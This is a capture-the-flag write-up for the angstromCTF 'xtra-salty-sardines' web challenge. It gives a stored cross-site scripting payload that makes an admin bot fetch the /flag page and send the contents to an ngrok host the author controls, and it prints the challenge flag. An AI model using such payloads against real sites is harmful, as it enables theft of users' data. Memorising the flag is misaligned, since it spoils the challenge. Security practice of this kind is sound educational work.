#### Challenge:

Clam was intensely brainstorming new challenge ideas, when his stomach growled! He opened his favorite tin of salty sardines, took a bite out of them, and then got a revolutionary new challenge idea. What if he wrote [a site with an extremely suggestive acronym](https://xtra-salty-sardines.web.actf.co)?

[Source](./index.js ":ignore"), [Admin Bot](https://admin-bot.actf.co/xtra-salty-sardines)

---

#### Solution:
Cross site scripting - You can submit content that will be put in div and the bot that has access to the flag will visit the page. We create free public DNS
to our machine and set up basic http server to see incoming request. Next we create payload that will run XMLHttpRequest to our local server.


```html
<>"'
<iframe id="if" src=""></iframe>
<script>
document.addEventListener("DOMContentLoaded", function () {
/* MY PUBLIC IP */
const PUBLIC_IP = "https://3aba-178-40-212-78.eu.ngrok.io/test?flag=" 
let xhr = new XMLHttpRequest();
xhr.open("get", "https://xtra-salty-sardines.web.actf.co/flag");
xhr.send();
xhr.onload = function () {
    var flag = xhr.response;
    document.getElementById("if").src = (PUBLIC_IP + flag );
}

    
});

</script>
<h1>
```

---

<details><summary>FLAG:</summary>

```
actf{those_sardines_are_yummy_yummy_in_my_tummy}
```

</details>
<br/>
